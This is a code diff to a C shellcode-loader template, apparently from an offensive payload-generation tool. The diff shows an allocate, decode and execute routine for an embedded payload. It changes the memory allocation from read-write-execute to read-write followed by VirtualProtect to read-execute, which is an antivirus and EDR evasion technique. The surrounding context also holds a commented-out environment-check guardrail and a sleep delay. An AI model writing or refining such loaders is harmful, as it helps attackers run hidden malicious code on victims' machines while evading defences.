@@ -21,8 +21,6 @@ int sleep_ms(DWORD sleeptime) {
 
 int main()
 {
-	//sleep_ms(10000);
-
 	// Execution Guardrail: Env Check
 	//wchar_t envVarName[] = {'U','S','E','R','P','R','O','F','I','L','E', 0};
 	//wchar_t tocheck[] = {'C',':','\\','U','s','e','r','s','\\','h','a','c','k','e','r', 0}; // L"C:\\Users\\hacker"
@@ -39,13 +37,18 @@ int main()
 
 	// Allocate 1
     // char *dest = ...
-    char *dest = VirtualAlloc(NULL, {{PAYLOAD_LEN}}, 0x3000, 0x40);
+    char *dest = VirtualAlloc(NULL, {{PAYLOAD_LEN}}, 0x3000, 0x04);  // rw
+
+	//sleep_ms(10000);
 
 	// Copy (and decode)
 	// from: supermega_payload[]
 	// to:   dest[]
 {{ plugin_decoder }}
 
+	if (VirtualProtect(dest, {{PAYLOAD_LEN}}, 0x20, &result) == 0) { // rx
+		return 7;
+	}
 
     // Execute *dest
     (*(void(*)())(dest))();
